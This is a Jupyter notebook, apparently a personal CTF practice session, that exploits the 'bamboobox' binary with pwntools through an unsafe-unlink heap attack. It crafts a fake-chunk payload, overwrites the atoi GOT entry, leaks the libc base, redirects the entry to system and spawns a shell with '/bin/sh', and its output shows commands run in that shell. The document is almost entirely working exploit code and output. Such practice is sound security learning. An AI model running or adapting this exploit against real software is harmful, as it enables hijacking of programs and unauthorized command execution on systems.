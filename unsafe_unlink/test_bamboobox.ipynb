{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "https://www.zhihu.com/question/21249496\n",
    "<img src=\"https://pic3.zhimg.com/80/v2-23d52081fdf330444fb6d54e02c2988e_720w.jpg?source=1940ef5c\" style=\"width: 500px; height: 400px\" />"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[*] '/media/bohan/Elements SE/tools/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc-2.27.so'\n",
      "    Arch:     amd64-64-little\n",
      "    RELRO:    Partial RELRO\n",
      "    Stack:    Canary found\n",
      "    NX:       NX enabled\n",
      "    PIE:      PIE enabled\n",
      "[*] '/home/bohan/res/ubuntu_share/pwn_test/unsafe_unlink_1/bamboobox'\n",
      "    Arch:     amd64-64-little\n",
      "    RELRO:    Partial RELRO\n",
      "    Stack:    Canary found\n",
      "    NX:       NX enabled\n",
      "    PIE:      No PIE (0x400000)\n"
     ]
    }
   ],
   "source": [
    "%load_ext autoreload\n",
    "%autoreload 2\n",
    "formatter = get_ipython().display_formatter.formatters['text/plain']\n",
    "formatter.for_type(int, lambda n, p, cycle: p.text(\"0x%X\" % n))\n",
    "\n",
    "import os\n",
    "os.sys.path.append('../')\n",
    "\n",
    "from pwn import *\n",
    "\n",
    "libc=ELF('/media/bohan/Elements SE/tools/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc-2.27.so')\n",
    "bamboobox=ELF('/home/bohan/res/ubuntu_share/pwn_test/unsafe_unlink_1/bamboobox')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {},
   "outputs": [],
   "source": [
    "init_linux_server('/home/bohan/ida_linux_dbg_server/linux_server64', ['-i192.168.0.104'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "metadata": {},
   "outputs": [],
   "source": [
    "stop_linux_server()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "z_write = write_pipe\n",
    "z_print = lambda *args: None"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "z_write = stdin_write\n",
    "z_print = print_stdout"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "def send_line(s):\n",
    "    z_write(s + '\\n')\n",
    "    z_print()\n",
    "    \n",
    "def show_item():\n",
    "    z_write('1\\x00', waittime=0.3)\n",
    "    z_print()\n",
    "def add_item(name_len, name):\n",
    "    z_write('2\\x00', name_len, name, waittime=0.3)\n",
    "    z_print(False)\n",
    "def change_item(i, name_len, new_name):\n",
    "    z_write('3\\x00', i, name_len, new_name, waittime=0.3)\n",
    "    z_print(False)\n",
    "def remove_item(i):\n",
    "    z_write('4\\x00', i, waittime=0.3)\n",
    "    z_print()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "metadata": {},
   "outputs": [],
   "source": [
    "# os.read(w_pipe, 1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n"
     ]
    }
   ],
   "source": [
    "show_item()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [],
   "source": [
    "# add_item(0x20,'aaaa')#0\n",
    "add_item(0x420,'aaaa')#0"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [],
   "source": [
    "# add_item(0x80,'bbbb')#1\n",
    "add_item(0x420,'bbbb')#1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [],
   "source": [
    "add_item(0x420,'cccc')#2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [],
   "source": [
    "fd=0x6020d8-0x18\n",
    "bk=0x6020d8-0x10\n",
    "payload1=p64(0x0)+p64(0x421)#fake_chunk\n",
    "payload1+=p64(fd)+p64(bk)\n",
    "payload1+=p64(0) * int(0x420/8 - 4)\n",
    "payload1+=p64(0x420)+p64(0x430)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0x430"
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(payload1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "# print_hex(payload1, start_offset=0x86b0, format=\"hex\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "# change_item(1,0x90,payload1)\n",
    "change_item(1, 0x430, payload1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Please enter the index of item:remove successful!!\n",
      "----------------------------\n",
      "Bamboobox Menu\n",
      "----------------------------\n",
      "1.show the items in the box\n",
      "2.add a new item\n",
      "3.change the item in the box\n",
      "4.remove the item in the box\n",
      "5.exit\n",
      "----------------------------\n",
      "Your choice:\n"
     ]
    }
   ],
   "source": [
    "remove_item(2)\n",
    "# remove_item(1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [],
   "source": [
    "change_item(1,0x20, b'a'*8+p64(bamboobox.got['atoi'])) # 将第0个的编辑地址改为atoi的地址"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'0 : 0\\xf7\\xeb\\xad\\x1a\\x7f1 : aaaaaaaah `\\n'\n",
      "----------------------------\n",
      "Bamboobox Menu\n",
      "----------------------------\n",
      "1.show the items in the box\n",
      "2.add a new item\n",
      "3.change the item in the box\n",
      "4.remove the item in the box\n",
      "5.exit\n",
      "----------------------------\n",
      "Your choice:\n"
     ]
    }
   ],
   "source": [
    "show_item()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0x7F1AADE7EF90"
      ]
     },
     "execution_count": 22,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# 根据atoi的在内存中的位移和相对文件的位移, 计算libc在内存的载入地址\n",
    "libc_base = u64('0\\xf7\\xeb\\xad\\x1a\\x7f'.ljust(8,'\\x00')) - libc.sym['atoi'] \n",
    "libc.sym['atoi']\n",
    "libc_base"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [],
   "source": [
    "change_item(0,0x20,p64(libc_base + libc.sym['system']))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n"
     ]
    }
   ],
   "source": [
    "# 得到shell\n",
    "send_line('/bin/sh')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "bamboobox\n",
      "bamboobox1.py\n",
      "bamboobox.i64\n",
      "bamboobox.id0\n",
      "bamboobox.id1\n",
      "bamboobox.id2\n",
      "bamboobox.nam\n",
      "bamboobox.til\n",
      "core.bamboobox.8120\n",
      "ida-20210806-101040-7632.dmp\n",
      "pwn_test.ipynb\n",
      "笔记.txt\n",
      "\n"
     ]
    }
   ],
   "source": [
    "send_line('ls')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n"
     ]
    }
   ],
   "source": [
    "send_line('\\x04')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[b'bamboobox\\n', b'bamboobox1.py\\n', b'bamboobox.i64\\n', b'bamboobox.id0\\n', b'bamboobox.id1\\n', b'bamboobox.id2\\n', b'bamboobox.nam\\n', b'bamboobox.til\\n', b'core.bamboobox.8120\\n', b'ida-20210806-101040-7632.dmp\\n', b'pwn_test.ipynb\\n', b'\\xe7\\xac\\x94\\xe8\\xae\\xb0.txt\\n']"
      ]
     },
     "execution_count": 39,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "flush"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# 用pwntools"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[x] Starting local process '/home/bohan/res/ubuntu_share/pwn_test/unsafe_unlink_1/bamboobox'\n",
      "[+] Starting local process '/home/bohan/res/ubuntu_share/pwn_test/unsafe_unlink_1/bamboobox': pid 31204\n"
     ]
    }
   ],
   "source": [
    "p = process('/home/bohan/res/ubuntu_share/pwn_test/unsafe_unlink_1/bamboobox')\n",
    "def add(size,content):\n",
    "    p.sendlineafter('choice:',str(2))\n",
    "    p.sendlineafter('name:',str(size))\n",
    "    p.sendlineafter('item:',content)\n",
    "\n",
    "def show():\n",
    "    p.sendlineafter('choice:',str(1))\n",
    "\n",
    "def change(index,size,content):\n",
    "    p.sendlineafter('choice:',str(3))\n",
    "    p.sendlineafter('item:',str(index))\n",
    "    p.sendlineafter('name:',str(size))\n",
    "    p.sendlineafter('item:',content)\n",
    "\n",
    "def delete(index):\n",
    "    p.sendlineafter('choice:',str(4))\n",
    "    p.sendlineafter('item:',str(index))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'0 : '"
      ]
     },
     "execution_count": 53,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sleep(2)\n",
    "add(0x420,'aaaa')#0\n",
    "add(0x420,'bbbb')#1\n",
    "add(0x420,'cccc')#2\n",
    "fd=0x6020d8-0x18\n",
    "bk=0x6020d8-0x10\n",
    "payload1=p64(0x0)+p64(0x421)#fake_chunk\n",
    "payload1+=p64(fd)+p64(bk)\n",
    "payload1+=p64(0) * int(0x420/8 - 4)\n",
    "payload1+=p64(0x420)+p64(0x430)\n",
    "change(1,0x90,payload1)\n",
    "delete(2)#unlink\n",
    "change(1,0x20,b'a'*8+p64(bamboobox.got['atoi']))\n",
    "show()\n",
    "p.recvuntil(': ')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "metadata": {},
   "outputs": [
    {
     "ename": "TypeError",
     "evalue": "ljust() argument 2 must be a byte string of length 1, not str",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mTypeError\u001b[0m                                 Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-51-5bea84aa628f>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m     14\u001b[0m \u001b[0mshow\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     15\u001b[0m \u001b[0mp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mrecvuntil\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m': '\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 16\u001b[0;31m \u001b[0mlibc_base\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0mu64\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mrecv\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;36m6\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mljust\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;36m8\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0;34m'\\x00'\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m-\u001b[0m\u001b[0mlibc\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0msym\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0;34m'atoi'\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     17\u001b[0m \u001b[0mprint\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m\"libc_base:\"\u001b[0m\u001b[0;34m+\u001b[0m\u001b[0mhex\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mlibc_base\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     18\u001b[0m \u001b[0mchange\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;36m0\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0;36m0x20\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0mp64\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mlibc_base\u001b[0m\u001b[0;34m+\u001b[0m\u001b[0mlibc\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0msym\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0;34m'system'\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mTypeError\u001b[0m: ljust() argument 2 must be a byte string of length 1, not str"
     ]
    }
   ],
   "source": [
    "libc_base=u64(p.recv(6).ljust(8,'\\x00'))-libc.sym['atoi']\n",
    "print(\"libc_base:\"+hex(libc_base))\n",
    "change(0,0x20,p64(libc_base+libc.sym['system']))\n",
    "p.recvuntil(':')\n",
    "p.sendline('/bin/sh\\x00')\n",
    "p.interactive()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'aaaa\\n1'"
      ]
     },
     "execution_count": 54,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "a = p.recv(6)\n",
    "a"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python [conda env:.conda-mytorch] *",
   "language": "python",
   "name": "conda-env-.conda-mytorch-py"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
